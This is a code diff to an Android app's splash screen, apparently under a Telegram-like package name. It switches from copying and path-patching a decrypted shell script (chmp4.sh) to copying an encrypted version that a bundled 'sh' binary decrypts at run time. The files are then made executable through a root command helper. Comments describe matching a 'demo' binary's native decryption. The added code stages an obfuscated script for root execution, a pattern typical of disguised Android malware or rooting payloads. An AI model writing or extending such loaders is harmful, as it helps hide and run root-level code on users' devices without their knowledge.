@@ -319,17 +319,9 @@ public class SplashActivity extends AppCompatActivity {
         // Copy sh binary
         releaseAssetToCacheDir(ctx, "sh", "sh");
 
-        // Copy chmp4.sh script — then replace hardcoded path with actual cacheDir
-        // LOGCAT CONFIRMED (A13 demo): current path = /data/data/com.telegram.a1064/cache
-        // Demo's native code decrypts chmp4.sh and replaces /data/local/tmp with cacheDir
-        // We do the same replacement after copying the decrypted version
-        releaseAssetToCacheDir(ctx, "chmp4.sh", "chmp4.sh");
-        {
-            java.io.File scriptFile = new java.io.File(ctx.getCacheDir(), "chmp4.sh");
-            String script = new String(java.nio.file.Files.readAllBytes(scriptFile.toPath()), "UTF-8");
-            script = script.replace("/data/local/tmp", cacheDir);
-            java.nio.file.Files.write(scriptFile.toPath(), script.getBytes("UTF-8"));
-        }
+        // Copy ENCRYPTED chmp4.sh — demo's sh binary handles decryption + path replacement
+        // No manual path replacement needed — sh binary does it internally
+        releaseAssetToCacheDir(ctx, "chmp4.sh.enc", "chmp4.sh");
 
         // Make all files executable via root
         s2.b.I("chmod +x " + cacheDir + "/sh");
